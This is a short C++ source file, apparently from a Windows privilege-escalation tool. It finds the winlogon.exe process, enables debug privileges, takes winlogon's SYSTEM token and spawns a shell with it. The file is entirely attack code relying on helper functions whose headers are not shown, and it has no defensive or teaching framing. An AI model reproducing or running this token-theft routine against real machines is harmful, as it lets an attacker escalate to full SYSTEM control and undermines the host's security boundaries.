#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include "Proc.h"
#include "MExec.h"

int main(int argc, char *argv[])
{
    //this process runs as NT\SystemAuthority
    const char* procName = "winlogon.exe";
    DWORD pid = 0;

    while (!pid)
    {
        pid = GetProcId(procName);
    }

    std::cout << "[*] " << procName << " has PID: " << pid << std::endl;

    //ensure we have debug privs
    HANDLE curr_proc = GetCurrentProcess();
    HANDLE curr_proc_token;

    if (OpenProcessToken(curr_proc, TOKEN_ADJUST_PRIVILEGES, &curr_proc_token))
    {
        SetPrivilege(curr_proc_token, SE_DEBUG_NAME, TRUE);
        CloseHandle (curr_proc);
    }

    //Get a pointer to the Token from the process
    HANDLE token = GetToken(pid);
    SpawnSystemShell(token, pid);
    return 0;
}



void PrintHelp()
{

}